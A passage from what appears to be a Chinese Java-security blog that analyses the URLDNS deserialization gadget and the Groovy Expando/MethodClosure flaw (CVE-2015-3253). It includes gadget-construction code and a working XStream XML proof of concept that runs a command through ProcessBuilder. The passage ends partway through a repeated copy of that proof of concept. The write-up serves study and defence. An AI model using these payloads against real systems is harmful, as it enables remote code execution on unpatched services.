+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">········</span><br><span class="line"></span><br><span class="line">static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">        protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">                return null;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注释中提到“为避免在创建payload时触发DNS解析”，这里就有两个问题：</p>
+<pre><code>1、创建payload时为什么会触发DNS解析？
+2、重写URLStreamHandler的作用是什么呢？
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = new HashMap();  //HashMap中将包含URL</span><br><span class="line">URL u = new URL(null, url, handler);  //创建URL，作为HashMap中的key</span><br><span class="line">ht.put(u, url); //值可以是任何Serializable, URL作为key触发DNS lookup。</span><br></pre></td></tr></table></figure>
+<p>这几句的含义是创建一个HashMap，将URL对象作为key，在HashMap put操作的时候，会触发URL的序列化，在序列化的时候触发DNS解析。</p>
+<p>在开头注释中也提示了Gadget Chain</p>
+<ul>
+<li><pre><code>HashMap.readObject()
+</code></pre>
+</li>
+<li><pre><code>  HashMap.putVal()
+</code></pre>
+</li>
+<li><pre><code>    HashMap.hash()
+</code></pre>
+</li>
+<li><pre><code>      URL.hashCode()
+</code></pre>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);//在上面的put过程中，URL的hashCode被计算并缓存。这将重置它，以便下次调用hashCode时触发DNS查找。</span><br></pre></td></tr></table></figure>
+<p>这句在这里的作用不太好理解，大概推测是hashcode的值为-1时，有不同的作用，这个疑问我们也留到下文中来寻找答案。</p>
+<h2 id="0x01-java-net-URL类为什么会触发DNS解析？"><a href="#0x01-java-net-URL类为什么会触发DNS解析？" class="headerlink" title="0x01 java.net.URL类为什么会触发DNS解析？"></a>0x01 java.net.URL类为什么会触发DNS解析？</h2><p>根据注释中的Chain，我们找到URL.hashCode()，<code>if (hashCode != -1)</code>这句可以解释上节中的“-1”的疑问了，当不等于“-1”的时候，会直接返回，而不会调用到<code> handler.hashCode</code>中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续看<code> handler.hashCode</code>做了哪些事情，可以看到<code>getHostAddress</code>会请求一次DNS解析，构成反序列化链路中的执行点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br></pre></td></tr></table></figure>
+<p> </p>
+<h2 id="0x02-java-net-URL类如何触发DNS解析的（寻找触发点）？"><a href="#0x02-java-net-URL类如何触发DNS解析的（寻找触发点）？" class="headerlink" title="0x02 java.net.URL类如何触发DNS解析的（寻找触发点）？"></a>0x02 java.net.URL类如何触发DNS解析的（寻找触发点）？</h2><p>定位到触发点<code>HashMap.readObject()</code>，可以看到这个方法将<code>java.io.ObjectInputStream</code>反序列化后的值putVal进Node中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        // Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br><span class="line">        // what we&#x27;re actually creating.</span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>putVal</code>的入参如下，其中在第一个入参hash方法（计算key.hashCode()并将较高的哈希值扩展为较低的哈希值），会调用key的hashcode方法。所以如果key是URL对象的话，就会调用到URL.hashCode方法，进而触发DNS解析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Implements Map.put and related methods</span><br><span class="line"> *</span><br><span class="line"> * @param hash hash for key</span><br><span class="line"> * @param key the key</span><br><span class="line"> * @param value the value to put</span><br><span class="line"> * @param onlyIfAbsent if true, don&#x27;t change existing value</span><br><span class="line"> * @param evict if false, the table is in creation mode.</span><br><span class="line"> * @return previous value, or null if none</span><br><span class="line"> */</span><br><span class="line">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">               boolean evict)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-如何利用-利用代码为什么要这么写？"><a href="#0x03-如何利用-利用代码为什么要这么写？" class="headerlink" title="0x03 如何利用/利用代码为什么要这么写？"></a>0x03 如何利用/利用代码为什么要这么写？</h2><p>需要注意两个点：<br>1、hashCode默认是-1，如果触发一次DNS解析，则会缓存hashCode，导致后续请求时无法触发；<br>2、避免在生成payload的时候put触发DNS解析，这里也就回答文章开头的两个疑问，通过重写getHostAddress避免触发DNS解析。</p>
+<h3 id="为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？"><a href="#为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？" class="headerlink" title="为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？"></a>为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？</h3><p>首先要明确序列化的目的，将java对象序列化，一定是为了在某个时刻能够将该对象反序列化，而且一般来讲序列化和反序列化所在的机器是不同的，因为序列化最常用的场景就是跨机器的调用，而序列化和反序列化的一个最基本的要求就是，反序列化之后的对象与序列化之前的对象是一致的。</p>
+<p>HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。</p>
+<p>Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key=’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的。</p>
+<p>参考链接：<a class="link" target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Jan 15 2019 21:00:00 GMT+0800">2019-01-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Security%20&%20Data/">
+                        Security &amp; Data
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8701.png" alt="幻灯片01"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8702.png" alt="幻灯片02"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8703.png" alt="幻灯片03"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8704.png" alt="幻灯片04"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8705.png" alt="幻灯片05"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8706.png" alt="幻灯片06"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8707.png" alt="幻灯片07"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8708.png" alt="幻灯片08"></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Jul 21 2018 21:00:00 GMT+0800">2018-07-21</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">安全数据分析</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/ML/">ML</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Security%20&%20Data/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Groovy%20Deserialization(groovy.util.Expando)CVE-2015-3253/">
+                        Groovy Deserialization(groovy.util.Expando)CVE-2015-3253
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253
+影响版本（1.7.0~2.4.3）
+调用链分析MethodClosure
+123456789101112131415161718192021222324252627282930public class MethodClosure extends Closure &#123;    private String method;    public MethodClosure(Object owner, String method) &#123;        super(owner);        this.method = method;        Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();        this.maximumNumberOfParameters = 0;        this.parameterTypes = new Class[0];        List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);        Iterator i$ = methods.iterator();        while(i$.hasNext()) &#123;            MetaMethod m = (MetaMethod)i$.next();            if (m.getParameterTypes().length &gt; this.maximumNumberOfParameters) &#123;                Class[] pt = m.getNativeParameterTypes();                this.maximumNumberOfParameters = pt.length;                this.parameterTypes = pt;            &#125;        &#125;    &#125;    public String getMethod() &#123;        return this.method;    &#125;    protected Object doCall(Object arguments) &#123;        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);    &#125;
+doCall()作用应该是执行构件好的对象（this.getOwner()）的方法（this.method）
+invokeMethod
+12345678910111213public static Object invokeMethod(Object object, String methodName, Object arguments) &#123;    if (object == null) &#123;        object = NullObject.getNullObject();    &#125;    if (object instanceof Class) &#123;        Class theClass = (Class)object;        MetaClass metaClass = metaRegistry.getMetaClass(theClass);        return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));    &#125; else &#123;        return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);    &#125;&#125;
+调用指定对象的指定方法所以可以利用这个方法来执行命令
+1MethodClosure mc = new MethodClosure(new java.lang.ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;).call();
+通过java.lang.ProcessBuilder对象的start方法执行open命令
+根据上边的分析，MethodClosure.call() == &quot;command&quot;.execute()
+找到了存在缺陷的方法，接下来就要看有哪些地方调用了这个方法断点调试call()可以看到被hashcode()调用了
+1234567891011public int hashCode() &#123;    Object method = this.getProperties().get(&quot;hashCode&quot;);    if (method != null &amp;&amp; method instanceof Closure) &#123;        Closure closure = (Closure)method;        closure.setDelegate(this);        Integer ret = (Integer)closure.call();        return ret.intValue();    &#125; else &#123;        return super.hashCode();    &#125;&#125;
+
+hashCode的功能和特性
+如果两个对象相同，那么它们的hashCode  值一定要相同
+如果两个对象的hashCode相同，它们并不一定相同     
+上面说的对象相同指的是用eqauls方法比较
+
+所以当两个对象进行比较时，会调用hashcode和eqauls，如果结果一致则相等
+12345678910111213141516171819202122public V put(K key, V value) &#123;    if (table == EMPTY_TABLE) &#123;        inflateTable(threshold);    &#125;    if (key == null)        return putForNullKey(value);    int hash = hash(key);    int i = indexFor(hash, table.length);    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;        Object k;        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;            V oldValue = e.value;            e.value = value;            e.recordAccess(this);            return oldValue;        &#125;    &#125;    modCount++;    addEntry(hash, key, value, i);    return null;&#125;
+
+put方法是用来向HashMap中添加新的元素，从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中
+所以当把我们构造的代码添加进去时，put就会调用hashcode进行比较，进而执行代码
+123public void setProperty(String property, Object newValue) &#123;    this.getProperties().put(property, newValue);&#125;
+
+Object method = this.getProperties().get(&quot;hashCode&quot;)自定义hashcode，调用setProperty可以绑定hashcode属性closure.call()注定了hashCode必须是Closure或者其子类才能最终调用call函数，MethodClosure类恰好是Closure的子类
+然后通过调用hashcode的put方法即可执行构造的代码
+
+poc
+123456789101112131415161718192021222324252627&lt;map&gt;   &lt;entry&gt;     &lt;groovy.util.Expando&gt;       &lt;expandoProperties&gt;         &lt;entry&gt;           &lt;string&gt;hashCode&lt;/string&gt;           &lt;org.codehaus.groovy.runtime.MethodClosure&gt;             &lt;delegate class=&quot;groovy.util.Expando&quot; reference=&quot;../../../..&quot;/&gt;             &lt;owner class=&quot;java.lang.ProcessBuilder&quot;&gt;               &lt;command&gt;                 &lt;string&gt;open&lt;/string&gt;                 &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;               &lt;/command&gt;               &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;             &lt;/owner&gt;             &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt;             &lt;directive&gt;0&lt;/directive&gt;             &lt;parameterTypes/&gt;             &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt;             &lt;method&gt;start&lt;/method&gt;           &lt;/org.codehaus.groovy.runtime.MethodClosure&gt;         &lt;/entry&gt;       &lt;/expandoProperties&gt;     &lt;/groovy.util.Expando&gt;     &lt;int&gt;1&lt;/int&gt;   &lt;/entry&gt; &lt;/map&gt;
+
+
+
+参考：https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/http://avfisher.win/archives/tag/groovy
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p><a class="link" target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253<i class="fas fa-external-link-alt"></i></a></p>
+<p>影响版本（1.7.0~2.4.3）</p>
+<h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p><strong>MethodClosure</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class MethodClosure extends Closure &#123;</span><br><span class="line">    private String method;</span><br><span class="line"></span><br><span class="line">    public MethodClosure(Object owner, String method) &#123;</span><br><span class="line">        super(owner);</span><br><span class="line">        this.method = method;</span><br><span class="line">        Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();</span><br><span class="line">        this.maximumNumberOfParameters = 0;</span><br><span class="line">        this.parameterTypes = new Class[0];</span><br><span class="line">        List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);</span><br><span class="line">        Iterator i$ = methods.iterator();</span><br><span class="line"></span><br><span class="line">        while(i$.hasNext()) &#123;</span><br><span class="line">            MetaMethod m = (MetaMethod)i$.next();</span><br><span class="line">            if (m.getParameterTypes().length &gt; this.maximumNumberOfParameters) &#123;</span><br><span class="line">                Class[] pt = m.getNativeParameterTypes();</span><br><span class="line">                this.maximumNumberOfParameters = pt.length;</span><br><span class="line">                this.parameterTypes = pt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getMethod() &#123;</span><br><span class="line">        return this.method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected Object doCall(Object arguments) &#123;</span><br><span class="line">        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>doCall()作用应该是执行构件好的对象（this.getOwner()）的方法（this.method）</p>
+<p><strong>invokeMethod</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static Object invokeMethod(Object object, String methodName, Object arguments) &#123;</span><br><span class="line">    if (object == null) &#123;</span><br><span class="line">        object = NullObject.getNullObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (object instanceof Class) &#123;</span><br><span class="line">        Class theClass = (Class)object;</span><br><span class="line">        MetaClass metaClass = metaRegistry.getMetaClass(theClass);</span><br><span class="line">        return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用指定对象的指定方法<br>所以可以利用这个方法来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = new MethodClosure(new java.lang.ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;).call();</span><br></pre></td></tr></table></figure>
+<p>通过java.lang.ProcessBuilder对象的start方法执行open命令</p>
+<p>根据上边的分析，<code>MethodClosure.call() == &quot;command&quot;.execute()</code></p>
+<p>找到了存在缺陷的方法，接下来就要看有哪些地方调用了这个方法<br>断点调试call()可以看到被hashcode()调用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object method = this.getProperties().get(&quot;hashCode&quot;);</span><br><span class="line">    if (method != null &amp;&amp; method instanceof Closure) &#123;</span><br><span class="line">        Closure closure = (Closure)method;</span><br><span class="line">        closure.setDelegate(this);</span><br><span class="line">        Integer ret = (Integer)closure.call();</span><br><span class="line">        return ret.intValue();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return super.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hashCode的功能和特性</p>
+<pre><code>如果两个对象相同，那么它们的hashCode  值一定要相同
+如果两个对象的hashCode相同，它们并不一定相同     
+上面说的对象相同指的是用eqauls方法比较
+</code></pre>
+<p>所以当两个对象进行比较时，会调用hashcode和eqauls，如果结果一致则相等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    if (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    if (key == null)</span><br><span class="line">        return putForNullKey(value);</span><br><span class="line">    int hash = hash(key);</span><br><span class="line">    int i = indexFor(hash, table.length);</span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(this);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>put方法是用来向HashMap中添加新的元素，从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中</p>
+<p>所以当把我们构造的代码添加进去时，put就会调用hashcode进行比较，进而执行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void setProperty(String property, Object newValue) &#123;</span><br><span class="line">    this.getProperties().put(property, newValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Object method = this.getProperties().get(&quot;hashCode&quot;)</code>自定义hashcode，调用setProperty可以绑定hashcode属性<br>closure.call()注定了hashCode必须是Closure或者其子类才能最终调用call函数，MethodClosure类恰好是Closure的子类</p>
+<p>然后通过调用hashcode的put方法即可执行构造的代码</p>
+<p><img lazyload src="/images/loading.svg" data-src="15307985501989.jpg"></p>
+<p><strong>poc</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt; </span><br><span class="line">  &lt;entry&gt; </span><br><span class="line">    &lt;groovy.util.Expando&gt; </span><br><span class="line">      &lt;expandoProperties&gt; </span><br><span class="line">        &lt;entry&gt; </span><br><span class="line">          &lt;string&gt;hashCode&lt;/string&gt; </span><br><span class="line">          &lt;org.codehaus.groovy.runtime.MethodClosure&gt; </span><br><span class="line">            &lt;delegate class=&quot;groovy.util.Expando&quot; reference=&quot;../../../..&quot;/&gt; </span><br><span class="line">            &lt;owner class=&quot;java.lang.ProcessBuilder&quot;&gt; </span><br><span class="line">              &lt;command&gt; 